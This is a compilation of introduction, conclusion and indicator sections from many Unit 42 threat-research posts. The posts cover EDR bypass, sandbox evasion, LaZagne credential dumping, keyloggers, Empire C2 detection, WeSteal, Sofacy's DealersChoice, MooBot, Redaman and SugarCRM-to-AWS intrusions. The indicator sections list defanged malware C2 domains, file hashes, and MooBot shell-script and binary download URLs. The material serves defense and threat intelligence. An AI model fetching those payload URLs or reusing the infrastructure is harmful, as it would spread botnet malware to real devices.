URL Filtering.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "This article reviews an incident where a threat actor unsuccessfully tried bypassing Cortex XDR. By digging further into the incident, the process instead provided us with insight into the threat actor's operations.\nIn a recent investigation involving an extortion attempt, we discovered a threat actor had purchased access to the client network via Atera RMM from an initial access broker. We discovered the threat actor used rogue systems to install the Cortex XDR agent onto a virtual system. They did this to test a new antivirus/endpoint detection and response (AV/EDR) bypass tool leveraging thebring your own vulnerable driver (BYOVD) technique.\nConnectivity between this virtual system and the client's network inadvertently gave Unit 42 investigators a certain level of access to the rogue systems. This provided visibility into various tools and files held by the threat actor. While the threat actor intended to find a way to bypass Cortex, in actuality this activity helped Unit 42 protect other organizations by providing unique visibility into the threat actor's tooling, targeting and persona.\nIn this report, we provide an overview of the attack that occurred, details about the AV/EDR bypass tool, and its sale on cybercrime forums. Most importantly, we offer a walkthrough for how Unit 42 researchers managed to unmask one of the threat actors involved. We'll give a peek into all the discoveries related to the identification of the threat actor.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nCortex XDRandXSIAM \nAdvanced WildFire \nAdvanced URL FilteringandAdvanced DNS Security\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Recently, there has been a growing trend in the use of AV/EDR bypass tools, extending beyond the incident discussed here. These tools will likely continue to evolve in their attempts to exploit various security platforms.\nOngoing monitoring of underground forums provides valuable insights into the latest developments and techniques of these tools. Threat actors and developers monetize such platforms on a subscription basis, regularly releasing updates as part of their affiliate payment plans.\nThis incident allowed us to expose a rogue system and, by extension, the toolkit and files owned by the threat actor. Using all the information gathered, Unit 42 unveiled what we believe to be the true identity of one of the threat actors and assessed their involvement in this incident.\nOrganizations should consider blocking the indicators of compromise provided in this report, as they are associated with the arsenal observed in the incident, as well as the toolkit present in the rogue system. More broadly, we recommend reviewing your security tool policies and configurations to ensure that agent tampering protection is enabled, preventing malicious activities targeting the endpoint protection agents on your systems.", "source": "Palo"}, {"title": "Introduction", "content": "When malware authors go to great lengths to avoid behaving maliciously if they detect they're running in a sandbox, sometimes the best answer for security defenders is to write their own sandbox that can't easily be detected. There are a lot of sandboxing approaches out there with pros and cons to each. We'll talk about why we chose to go the bespoke route, and we'll discuss many of the evasion types we had to cover in that effort as well as strategies that can be used to counter them.\nThere are many variations on how malware authors specifically detect sandboxes, but the general theme is that they will check the characteristics of the environment to see whether it looks like a targeted host rather than an automated system.\nPalo Alto Networks customers receive improved detection for the evasions discussed in this blog through Advanced WildFire.", "source": "Palo"}, {"title": "Conclusion", "content": "We emphasize that we are in no way claiming to have \"solved\" all sandbox evasions. In fact, the situation is quite the opposite when you consider that evasion classes are more or less infinite.\nIf there is a single takeaway from our discussion, it is that there are too many sandbox evasions out there to effectively address every single one. Anyone who tells you their sandbox is 100% evasion-proof is overdue for a run-in with reality.\nWe have discussed some of the high-level category evasions in broad strokes, as well as some of the strategies we're using to address them. Because we can't come close to addressing them all comprehensively, we recommend a defense-in-depth strategy. This allows us to architect detection systems in such a way that we can still detect malware when an evasion is successful and there is no execution of the payload.\nFor us on the WildFire team, this means a departure from simply relying on system API calls and other observable activity as the sole basis for detection. Because we have our own hypervisor, we have been able to utilize our control of all hardware/software to instrument software in the VM in a way that is invisible to the malware that is running.\nAs we discussed in ourprevious post on hypervisor memory analysisin Advanced WildFire, our goal is to make a new kind of analysis engine that targets malware in memory. For any evasion technique discussed here, the code to execute it must, at some point, exist in memory in order for it to execute and then successfully detect it is being analyzed.\nIn our system, we've shifted detection focus to the deltas in memory during execution. As shown in Figure 12, if the payload or any code is decoded, decompressed or decrypted in memory, our system will have visibility and a solid chance at catching it.\nIn closing, our advice to anyone building out an automated malware analysis system is to be as flexible as possible in terms of reacting to the broad categories of sandbox evasions out there. It is guaranteed that you will run into many variations of the themes we discussed here.\nWe also recommend that you architect your system in a way that is tolerant to sandbox evasions. In other words, when all else fails and there are no execution events to scrutinize for malicious behaviors, there should be additional methods to fall back on. An example of what this looks like in practice is how we can analyze memory in Advanced WildFire to detect evasive malware even when payloads choose to remain dormant and not execute.\nThanks for joining us on this odyssey as we toured all of the ways malware authors go out of their way to avoid detection. Happy hunting!\nPalo Alto Networks customers receive protections from threats such as those discussed in this post withAdvanced WildFire.", "source": "Palo"}, {"title": "Introduction", "content": "Configuration data that changes across each instance of deployed malware can be a gold mine of information about what the bad guys are up to. The problem is that configuration data in malware is usually difficult to parse statically from the file, by design. Malware authors know the intelligence value as they provide directives for how the malware should behave.\nMalware is like most complex software systems in that there are many advantages for code reuse and abstraction. Therefore, it is not surprising to see that the concept of software configuration is pervasive across the various malware families we analyze. After all, it's pretty hard to imagine a stereotypical cybercriminal wanting to bother with recompiling their code to change an IP address or whatever else, when going after different targets.\nBut the good news is that statically armored configuration data can often easily be found and parsed directly from memory. We will cover a nice example of an IcedID (information stealer) configuration, how it was obfuscated and how we've extracted it.\nPalo Alto Networks customers receive improved detection for the evasions discussed in this blog through Advanced WildFire. As we continue to parse and extract this information from malware families at scale, we hope to build out a pool of threat intelligence that will better help us understand the campaigns and tactics of the various threat actors who are targeting various organizations.", "source": "Palo"}, {"title": "Conclusion", "content": "Thank you for joining us in this overview of malware configurations and why we are working hard to parse this information at scale in Advanced WildFire. Reverse engineering variants of each malware family allow us to build out parsers to extract meaningful and relevant data for all of them at scale.\nThere is a staggering amount of diversity among payloads in the malware landscape, which makes the task of supporting them all more or less impossible. Where possible, we use metrics-based approaches to prioritize focus on the malware families and variants most relevant to our customers. In this ongoing area of research, our team will continue to expand support for new malware families and variants.\nPalo Alto Networks customers receive protections from threats such as those discussed in this post withAdvanced WildFire.", "source": "Palo"}, {"title": "Introduction", "content": "Attackers have increased targeted attacks on Linux systems, and the easy accessibility of hacktool utilities like LaZagne (a popular open-source password recovery tool) has made this increasingly convenient for threat actors to use in malware attack chains for dumping passwords. The tool poses a significant risk to Linux users because it targets popular chat software like Pidgin, using D-Bus APIs to extract sensitive information including passwords.\nThis article provides a concise overview of how LaZagne leverages the Pidgin D-Bus APIs to fetch this information, and why keeping an eye on the D-Bus APIs can be a smart security move. We will also examine how attackers use LaZagne in specific malware campaigns.\nAdvanced WildFirefor Linux empowered with eBPF successfully detects D-Bus API related activities. Palo Alto Networks customers receive protection from the hacktool LaZagne in Wildfire through YARA and behavioral rules to detect suspicious activity related to the LaZagne threat.", "source": "Palo"}, {"title": "Introduction", "content": "Desktop-Bus, commonly calledD-Bus, is an inter-process communication (IPC) mechanism in *nix-based systems that allows applications and services to communicate with each other efficiently. D-Bus uses a client-server architecture where thedbus-daemonapplication acts as a server and applications act as clients.\nD-Bus is widely used in popular software like NetworkManager, PulseAudio, systemd and Evolution, and it enables seamless communication between various system components and applications. For example, Evolution email clients use D-Bus for communication with other components like the Evolution Data Server. This data server handles tasks such as storing and managing email accounts, contacts and calendars.\nThe D-Bus APIs on a Linux system facilitate communication between applications and services, potentially exposing sensitive data. Therefore, the APIs could pose risk if they are not monitored. The LaZagne hacktool leverages thePidginD-Bus APIs to dump credentials.", "source": "Palo"}, {"title": "Conclusion", "content": "Closely monitoring D-Bus APIs could be an important way for defenders to secure applications and connected systems against malware and hacktools. Developers and cybersecurity professionals must collaborate to stay informed about security risks and take necessary actions to protect applications and sensitive user data.\nWith the increasing adoption of cloud computing and IoT, robust security measures are essential.Advanced WildFirefor Linux empowered with eBPF successfully detects D-Bus API related activities. Palo Alto Networks customers receive protection from the hacktool LaZagne in Wildfire through YARA and behavioral rules to detect suspicious activity related to the LaZagne threat.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Surveillance malware covers a broad range of capabilities, including:\nCapture of keyboard and / or input device (e.g., mouse) activity, with window / process awareness (keylogging) \nTaking asset display screen shots or video (display capturing) \nAssuming control of cameras and / or microphones attached to an asset (live surveillance) \nInterception of network communications (sniffing)\nEach of these capabilities can be qualified by its scope (i.e., types of information collected) and method (ranging in techniques and sophistication). Additionally, some surveillance software includes its own exfiltration mechanism, while others may depend on external software to accomplish the transfer of captured information.\nBoth Predator Pain and HawkEye are consideredkeyloggers, but they also include additional features, such as web browser and e-mail clientcredential dumping,display capture, andcaptured information exfiltration. HawkEye is openly sold on a commercial website, whereas Predator Pain is usually acquired through underground forums. Associated features have made this set of malware popular with malicious actors across a number of motivations; however, the most prevalent motivation remains cyber crime, in which stolen information is directly exploited or sold for financial gain. (A list of additional reading links is found at the end of this blog post for anyone interested in learning more about this specific threat set.)", "source": "Palo"}, {"title": "Conclusion", "content": "Prevention is the best strategy when it comes to the threat posed by keyloggers, such as the Predator Pain and HawkEye set. System hardening, integrity assurance, software version and patch management, and user awareness are just the first steps towards threat mitigation.\nRecommendations to protection against this class of threat include:\nEmploy multi-factor authentication:Knowledge-based authentication relies on the secrecy of information. Including elements of what you have (i.e., hardware token) or what you are (i.e., biometrics) can reduce the value of respective stolen credentials for an adversary if that information only satisfies one level in the authentication process. \nLimit the impact of stolen credential information:Don't share credentials across accounts and change those credentials periodically. Adversaries commonly engage in activities such ascredential stuffingin an attempt to maximize benefits of stolen credentials. \nMaximize network control and visibility:The latest Verizon DBIR included the finding that in over 25% of breaches, the organization was notified of the breach through a third party. Inbound, outbound, and internal network traffic needs to be controlled and monitored. This is also useful for disrupting malware C2 and exfiltration channels. \nIntegrate anti-malware automated dynamic analysis (e.g., sandboxing):Identify previously unknown threats before they become much larger problems on the network. Given the anti-detection tools at the disposal of adversaries, this is a modern necessity. \nImplement network segmentation:Avoid flat networks, where once an adversary is in they have unrestricted access to internal resources. Network segmentation is a best practice for exposing only enough information as is required for specific organizational processes, moving toward a \"zero trust\" model. In this context, it is about further limiting the access of an adversary should they successful compromise credentials.", "source": "Palo"}, {"title": "Introduction", "content": "PowerShell Empire is a popular post-exploitation framework used by threat actors, and it remains an ongoing threat. Using machine learning (ML) and artificial intelligence (AI) methods, we have developed an extremely effective system to detect Empire's command and control (C2) traffic.\nIn this article, we review the Empire framework, examine Empire C2 traffic and discuss issues affecting ML-based C2 detection. The primary issue isadversarial attacks, a category of AI attack that threat actors can use to poison or evade ML-based detection. We solved this challenge by developing a learning system using a more robust model withadversarial training. Thisrobust learningsystem will effectively counter a threat actor's attempt to evade ML-based C2 detection.\nWe review the concepts behind our Empire C2 robust learning system, and we discuss the effectiveness of training this model with both real-world traffic and AI-generated data.\nPalo Alto Networks customers receive protection from and mitigations for Empire C2-based attacks through ourNext-Generation Firewallwith anAdvanced Threat Preventionsubscription,WildFire,Cortex XDRandPrisma Cloud.", "source": "Palo"}, {"title": "Conclusion", "content": "Empire C2 is a widely used framework used by red team personnel and malicious threat actors. Empire's support for Malleable C2 profiles further enhances configurability and makes detection more difficult. We reviewed how Empire C2 works and discussed why we picked this framework to train our ML-based robust learning system.\nOur approach trains the model with both real-world examples and simulated adversarial attacks, improving the robustness of our Empire C2 detection.\nPalo Alto Networks customers receive protections from and mitigations for Empire C2 based attacks in the following ways:\nNext-Generation Firewallwith anAdvanced Threat Preventionsubscription can identify and block PowerShell Empire HTTP C2 requests (signatures 86715, 86720, 8672, 86732, and 86733). \nNext-Generation Firewallwith anAdvanced Threat Preventionsubscription can identify and block PowerShell Empire HTTP C2 requests generated by custom profiles. \nAdvanced WildFireandCortex XDRcan identify and block PowerShell Empire beacon binaries. \nCortex XSOAR response pack and playbook can automate the mitigation process. \nCortex XDR will report related exploitation attempts. \nMalicious URLs and IPs have been added toAdvanced URL Filtering.\nIf you think you might have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "It seems that for every commodity malwaretakedownandprosecution, another replaces it to take a turn empowering cybercriminals. Often, commodity malware authors will disingenuously attempt to profess a guise oflegitimacyfor their malware \u2013 a strategy that often doesn't stand up incourt.\nThe author of WeSteal, a new commodity cryptocurrency stealer, makes no attempt to disguise the intent for his malware. The seller promises \"the leading way to make money in 2021\" (Figure 1).\nIn this blog, we analyze WeSteal, detail the obfuscation and techniques it uses for persistence and operation, and examine the customers of this malware. We take a look at the actor WeSupply, with an operation and website by the same name, and at the Italian malware coder ComplexCodes, a co-conspirator and actual author of this malware.\nImmediately before the publication of this report, we discovered that the actors had both added some new features to WeSteal, and had also complemented it with a new commodity remote access tool (RAT) called \"WeControl\". We document these new revelations at the end of our report.\nPalo Alto Networks customers are protected from WeSteal and WeControl withCortex XDR, theNext-Generation FirewallwithWildFireandThreat Preventionsecurity subscriptions, andAutoFocus.", "source": "Palo"}, {"title": "Conclusion", "content": "WeSteal is a shameless piece of commodity malware with a single, illicit function. Its simplicity is matched by a likely simple effectiveness in the theft of cryptocurrency. The low-sophistication actors who purchase and deploy this malware are thieves, no less so than street pickpockets. Their crimes are as real as their victims.\nThe fast and simple monetization chain and anonymity of cryptocurrency theft, together with the low cost and simplicity of operation, will undoubtedly make this type of crimeware attractive and popular to less-skilled thieves.\nWeControl is similarly both designed and marketed as a tool for illicit activity, lacking in propriety no less than the earlier WeSteal.\nThe ease of detection and blocking of the C2 as a service works against the Italian malware author ComplexCodes. It's surprising that customers trust their \"victims\" to the potential control of the malware author, who no doubt could in turn usurp them, stealing the victim \"bots\" or replacing customers' wallets with one of ComplexCodes' own at any time. It's also surprising that the malware author would risk criminal prosecution for what must surely be a small amount of profit, given the apparently small customer base.\nOrganizations with effective spam filtering, proper system administration and up-to-date Windows hosts have a much lower risk of infection.\nPalo Alto Networks customers are further protected from WeSteal and WeControl with Cortex XDR or the Next-Generation Firewall with WildFire and Threat Prevention security subscriptions. AutoFocus users can track WeSteal and WeControl activity using theWeStealandWeControltags.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to deploy protections to their customers rapidly and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visithttps://www.cyberthreatalliance.org/.\nA SHA256 hash list of the 157 identified WeSteal samples, as of the time of publishing this report, is available at ourGitHub repository.\n59ffba39fc87eacd7c19498b5bb495d9c86c8bec40f3282e996aa80d77c45fa7ed6875d60a67149c6cee4798a305810c6bcaa9b0b9349ec397ed331d96707e372bdc916680402a973afca8407d83c299092515cf5cc78ad0a92a8ce2d72b6f7c8d37eef0308d5bd03d6c93ab247ca82d2157053822428ad1c787771de8e4332fe2b11c10832991577184abd4f57af7383f30142a52fc8e2b41145f416860acf10920763b06f0a90f57910aaeff361d978bf37b025cbb9bc206d290eeb81e6217eac7d579002f5e7f2cbff86b8e233c433f14ae25faf112eabaa1e2dd4f2a9a3d\nwesupply[.]towesupply[.]io", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has reported on various Sofacy group attacks over the last year, most recently with a post onKomplex,an OS X variant of a tool commonly used by the Sofacy group. In the same timeframe of the Komplex attacks, we collected several weaponized documents that use a tactic previously not observed in use by the Sofacy group. Weaponizing documents to exploit known Microsoft Word vulnerabilities is a common tactic deployed by many adversary groups, but in this example, we discovered RTF documents containing embedded OLE Word documents further containing embedded Adobe Flash (.SWF) files, designed to exploitFlashvulnerabilities rather than Microsoft Word. We have named this tool that generates these documentsDealersChoice.\nIn addition to the discovery of this new tactic, we were able to identify two different variants of the embedded SWF files: the first being a standalone version containing a compressed payload which we have dubbed DealersChoice.A and a second variant being a much more modular version deploying additional anti-analysis techniques which we have dubbed DealersChoice.B. The unearthing of DealersChoice.B suggests a possible code evolution of the initial DealersChoice.A variant. Also, artifacts within DealersChoice suggests that Sofacy created it with the intentions to target both Windows and OSX operating systems, as DealersChoice could potentially be cross-platform due to its use of Adobe Flash files.\nTargeting data of Sofacy group attacks remain limited, but we were able to identify a Ukrainian based defense contractor as well as the Ministry of Foreign Affairs of a nation state in that same region as being targeted by these attacks. The following post focuses on our study of DealersChoice, though it is worth noting that the U.S. government has recently attributed many of the same indicators of compromise associated with this entity during the DNC intrusion to Russia. (Sofacy, also known as APT 28, is a group commonly attributed to Russia.)", "source": "Palo"}, {"title": "Conclusion", "content": "DealersChoice is an exploit platform that allows the Sofacy threat group to exploit vulnerabilities in Adobe Flash. Cross-platform exploits are obviously a focus for Sofacy, as they included checks within DealersChoice to determine the operating system of the targeted system. These checks were specifically for Apple's OS X operating system, which coupled with ourdiscovery of Sofacy's Komplex OSX Trojansuggests that this threat group is capable of operating in both Windows and Apple environments. Our analysis of DealersChoice has also led us to the discovery of a potential tiered infrastructure that leverages transparent proxies to hide the true location of Sofacy's C2 servers.\nPalo Alto Networks customers are protected from DealersChoice delivery documents and the Sofacy Carberp payload via:\nWildFire detection of all known samples as malicious \nAll known C2s are classified as malicious in PAN-DB \nTraps was able to block exploit code used by DealersChoice\nAutoFocus customers can gather additional information on DealersChoice and Sofacy Carberp via:\nAutoFocus tags have been createdDealersChoice \nPayload matches SofacyCarberp tag in AutoFocus", "source": "Palo"}, {"title": "Indicators", "content": "DealersChoice.A\ndc2c3314ef4e6186b519af29a246679caa522acd0c44766ecb9df4d2d5f3995b\nDealersChoice.B\ncc68ed96ef3a67b156565acbea2db8ed911b2b31132032f3ef37413f8e2772c5\naf9c1b97e03c0e89c5b09d6a7bd0ba7eb58a0e35908f5675f7889c0a8273ec81\nDealersChoice.B C2\nappexsrv[.]net\nSofacy Carberp\n73db52c0d4e31a00030b47b4f0fa7125000b19c6c9d462c3d0ce0f9d68f04e4c\nSofacy Carberp C2\nservicecdp[.]com", "source": "Palo"}, {"title": "Introduction", "content": "This article reviews nine vulnerabilities we recently discovered in two utilities calledcuobjdumpandnvdisasm, both from NVIDIA's Compute Unified Device Architecture (CUDA) Toolkit. We have coordinated with NVIDIA, and the company has releasedan update in February 2025to address these issues.\nThe vulnerabilities are tracked as the following Common Vulnerabilities and Exposures (CVEs):\nCVE-2024-53870 \nCVE-2024-53871 \nCVE-2024-53872 \nCVE-2024-53873 \nCVE-2024-53874 \nCVE-2024-53875 \nCVE-2024-53876 \nCVE-2024-53877 \nCVE-2024-53878\nIntroduced in 2006, CUDA is a parallel computing platform and programming model. As part of NVIDIA's CUDA Toolkit, developers use thecuobjdumpandnvdisasmtools to analyze CUDA binary files used in programs to run on NVIDIA graphics processing unit (GPU) hardware.\nWhile these two tools don't directly execute CUDA code, they are essential for developers to inspect and optimize CUDA-based programs for NVIDIA GPUs. Successfully exploiting the associated vulnerabilities might lead to limited denial of service or limited information disclosure. Potential attackers could impact organizations through vulnerable versions ofcuobjdumpandnvdisasmin targeted developer environments.\nPalo Alto Networks customers are better protected from the potential impact of these vulnerabilities through ourNext-Generation Firewall (NGFW)withCloud-Delivered Security Servicesthat includeAdvanced Threat Prevention.\nWe also recommend using the most recent CUDA Toolkit release to avoid vulnerable versions ofcuobjdumpandnvdisasm.\nTheUnit 42 Incident Response Teamcan also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Conclusion", "content": "NVIDIA's CUDA Toolkit is a fundamental component of the broader CUDA ecosystem, which supports the development, deployment and execution of CUDA programs.\nWhilecuobjdumpandnvdisasmare not directly involved in executing CUDA code, they are essential for developers looking to inspect and optimize their GPU programs.\nVulnerabilities in tools likecuobjdumpandnvdisasmhave wider implications, because they are part of the CUDA Toolkit. Attackers could possibly target organizations if these vulnerabilities exist in their development environments. CUDA is widely used in security-sensitive applications in generative AI, machine learning and scientific computing. We recommend that developers use the most up-to-date version of this and any other development platform.\nNVIDIA released a security update to address these vulnerabilities in February 2025, so concerned parties can update to the latest version and avoid these vulnerabilities.\nPalo Alto Networks Protection and Mitigation\nPalo Alto Networks customers are better protected by our products likeNext-Generation Firewall (NGFW)withCloud-Delivered Security Servicesthat includeAdvanced Threat Prevention.\nNGFW with an Advanced Threat Prevention subscription can identify and block the command injection traffic, when following best practices, via the following Threat Prevention signatures:95847,95848,95849,95850,95852,95853,95854,95855,95856\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107", "source": "Palo"}, {"title": "Introduction", "content": "This is the second part of our series on \"connecting the dots,\" where we investigate ways to link attacks together to gain a better understanding of how they are related. InPart 1, we looked at how domain WHOIS information can be used to identify connections between malicious domains and potentially the actors who own them. In Part 2 we dive into Passive DNS (PDNS), which allows analysts to look back in time and discover how a domain has been used in the past.", "source": "Palo"}, {"title": "Introduction", "content": "A security issue assignedCVE-2020-8558was recently discovered in the kube-proxy, a networking component running on Kubernetes nodes. The issue exposed internal services of Kubernetes nodes, often run without authentication. On certain Kubernetes deployments, this could have exposed the api-server, allowing an unauthenticated attacker to gain complete control over the cluster. An attacker with this sort of access could steal information, deploy crypto miners or remove existing services altogether.\nThe vulnerability exposed nodes' localhost services \u2013 services meant to be accessible only from the node itself \u2013 to hosts on the local network and to pods running on the node. Localhost bound services expect that only trusted, local processes can interact with them, and thus often serve requests without authentication. If your nodes run localhost services without enforcing authentication, you are affected.\nThe issue details weremade publicon April 18, 2020, and apatchreleased on June 1, 2020. We worked to assess additional impact to Kubernetes clusters and found that some Kubernetes installations don't disable the api-serverinsecure-port, which is normally only accessible from within the master node. Exploiting CVE-2020-8558, attackers can gain access to theinsecure-portand gain full control over the cluster.\nWe alerted the Kubernetes security team of the potential impact of this vulnerability. In turn, the team rated the vulnerability's impact as High in clusters where the api-serverinsecure-portis enabled, and otherwise Medium. Luckily, CVE-2020-8558's impact is somewhat reduced on most hosted Kubernetes services like Azure Kubernetes Service (AKS), Amazon's Elastic Kubernetes Service (EKS) and Google Kubernetes Engine (GKE). CVE-2020-8558 was patched in Kubernetes versions v1.18.4, v1.17.7, and v1.16.11 (released June 17, 2020). All users are encouraged to update.\nPrisma Cloud customers are protected from this vulnerability through the capabilities described in the Conclusion section.", "source": "Palo"}, {"title": "Conclusion", "content": "CVE-2020-8558 can have some serious consequences. You should patch your clusters as soon as possible. CVE-2020-8558 also serves as a reminder that security best practicesdo workand significantly reduce attack surface. You should disable the api-serverinsecure-port, and if your pods don't requireCAP_NET_RAW, there's no reason they should have that capability. While not related to this specific issue, we recommend implementing other security recommendations such as RBAC or running containers as a non-root user.\nPalo Alto NetworksPrisma Cloudcustomers are protected from this vulnerability. Compliance rules ensure your clusters are configured securely, blocking or alerting on:\nThe api-server insecure port \nPods running withCAP_NEW_RAW", "source": "Palo"}, {"title": "Introduction", "content": "In early August, Unit 42 researchers discovered attacks leveraging several vulnerabilities in devices made by D-Link, a company that specializes in network and connectivity products. The vulnerabilities exploited include:\nCVE-2015-2051: D-Link HNAP SOAPAction Header Command Execution Vulnerability \nCVE-2018-6530: D-Link SOAP Interface Remote Code Execution Vulnerability \nCVE-2022-26258: D-Link Remote Command Execution Vulnerability \nCVE-2022-28958: D-Link Remote Command Execution Vulnerability\nIf the devices are compromised, they will be fully controlled by attackers, who could utilize those devices to conduct further attacks such as distributed denial-of-service (DDoS) attacks. The exploit attempts captured by Unit 42 researchers leverage the aforementioned vulnerabilities to spread MooBot, a Mirai variant, which targets exposed networking devices running Linux.\nWhile D-Link has published security bulletins regarding all the vulnerabilities mentioned here, some users may be running unpatched or older versions or devices. Unit 42 strongly recommends applying upgrades and patches where possible.\nPalo Alto NetworksNext-Generation Firewallcustomers receive protections throughcloud-delivered security servicessuch as IoT Security, Advanced Threat Prevention, WildFire and Advanced URL Filtering, which can detect and block the exploit traffic and malware.", "source": "Palo"}, {"title": "Conclusion", "content": "The vulnerabilities mentioned above have low attack complexity but critical security impact that can lead to remote code execution. Once the attacker gains control in this manner, they could take advantage by including the newly compromised devices into their botnet to conduct further attacks such as DDoS.\nTherefore, we strongly recommend applying patches and upgrades when possible.\nPalo Alto Networks customers receive protections from the vulnerability and malware through the following products and services:\nNext-Generation Firewalls with a Threat Prevention security subscription can block the attacks with Best Practices via Threat Prevention signatures38600,92960,92959and92533. \nWildFirecan stop the malware with static signature detections. \nThe Palo Alto Networks IoT security platform can leverage network traffic information to identify the vendor, model and firmware version of a device and identify specific devices that are vulnerable to the aforementioned CVEs. \nAdvanced URL FilteringandDNS Securityare able to block the C2 domain and malware hosting URLs. \nIn addition,IoT Securityhas an inbuilt machine learning-based anomaly detection that can alert the customer if a device exhibits non-typical behavior, such as a sudden appearance of traffic from a new source, an unusually high number of connections or an inexplicable surge of certain attributes typically appearing in IoT application payloads.", "source": "Palo"}, {"title": "Indicators", "content": "Infrastructure\nvpn.komaru[.]today\nhttp://159.203.15[.]179/wget.shhttp://159.203.15[.]179/wget.sh3http://159.203.15[.]179/mipshttp://159.203.15[.]179/mipselhttp://159.203.15[.]179/armhttp://159.203.15[.]179/arm5http://159.203.15[.]179/arm6http://159.203.15[.]179/arm7http://159.203.15[.]179/sh4http://159.203.15[.]179/archttp://159.203.15[.]179/sparchttp://159.203.15[.]179/x86_64http://159.203.15[.]179/i686http://159.203.15[.]179/i586\nArtifacts\nTable 3. Shell script downloader.\nTable 4. MooBot samples.", "source": "Palo"}, {"title": "Introduction", "content": "Redaman is banking malware first noted in 2015 that targets recipients who conduct transactions using Russian financial institutions. First reported as theRTM banking Trojan, vendors likeSymantecandMicrosoftdescribed an updated version of this malware as Redaman in 2017. We have found versions of Redaman in Russian language mass-distribution campaigns during the last four months of 2018. This blog tracks recent developments from an ongoing campaign of malicious spam (malspam) currently distributing this banking malware from September through December of 2018. We cover the following areas:\nInfection vector \nEmail characteristics \nTargeted recipients \nAnalysis of a Redaman sample \nInfection traffic", "source": "Palo"}, {"title": "Conclusion", "content": "Since it was first noted in 2015, this family of banking malware continues targeting recipients who conduct transactions with Russian financial institutions. We found over 100 examples of malspam during the last four months of 2018, and this blog provides a closer look at Redaman during that timeframe. We covered the following areas:\nInfection vector \nEmail characteristics \nTargeted recipients \nAnalysis of a Redaman sample \nInfection traffic\nWe expect to discover new Redaman samples as 2019 progresses.\nPalo Alto Networks customers are protected from this threat. Traps identifies these files through Local Analysis and Wildfire has classified them as malicious. Our threat prevention platform detects this malware, and see the below appendices below for details on Redaman malware we discovered from September through December of 2018.\nSHA256 file hashes for 119 malspam attachments, 30 extracted Redaman executable files, and 30 dropped Redaman DLL files found from September through December 2018. Information is available at:https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-09-thru-2018-12-file-hashes-for-Redaman-banking-malware.txt\nSHA256 file hashes, archive file names, and extracted file names for Redaman banking malware found in September 2018. Information is available at:https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-09-file-hashes-for-Redaman-banking-malware.txt\nSHA256 file hashes, archive file names, and extracted file names for Redaman banking malware found in October 2018. Information is available at:https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-10-file-hashes-for-Redaman-banking-malware.txt\nSHA256 file hashes, archive file names, and extracted file names for Redaman banking malware found in November 2018. Information is available at:https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-11-file-hashes-for-Redaman-banking-malware.txt\nSHA256 file hashes, archive file names, and extracted file names for Redaman banking malware found in December 2018. Information is available at:https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-12-file-hashes-for-Redaman-banking-malware.txt", "source": "Palo"}, {"title": "Introduction", "content": "While the SugarCRM CVE-2023-22952 zero-day authentication bypass and remote code execution vulnerability might seem like a typical exploit, there's actually more for defenders to be aware of. Because it's a web application, if it's not configured or secured correctly, the infrastructure behind the scenes can allow attackers to increase their impact. When a threat actor understands the underlying technology used by cloud service providers, they can accomplish a great deal if they can gain access to credentials that have the right permissions.\nDuring the past year, Unit 42 responded to multiple cases where the SugarCRM vulnerabilityCVE-2023-22952was an initial attack vector that allowed threat actors to gain access to AWS accounts. This was not due to a vulnerability in AWS, and it could have happened with any cloud environment. Instead, the threat actors took advantage of misconfigurations to expand their access after initial compromise.\nThis article maps out various attacks against AWS environments following theMITRE ATT&CK Matrixframework, wrapping up with multiple prevention mechanisms an organization can put in place to protect themselves. Some of these protections include taking advantage of controls and services provided by AWS, cloud best practices, and ensuring sufficient data retention to catch the full attack.\nThe complexity of these attacks shows how it's important to set your logging and monitoring to detect any unauthorized AWS API calls, even if they're seemingly innocuous. If threat actors are allowed to gain a foothold, this can lead to much more daunting activity that is not always traceable. One size does not fit all in cloud security, but these attacks highlight key areas to focus on to make sure you're ready to defend against those attacks when they come.\nPalo Alto Networks customers receive protections from the attacks described in this article in the following ways:\nOrganizations can engage theUnit 42 Incident Responseteam for specific assistance with this 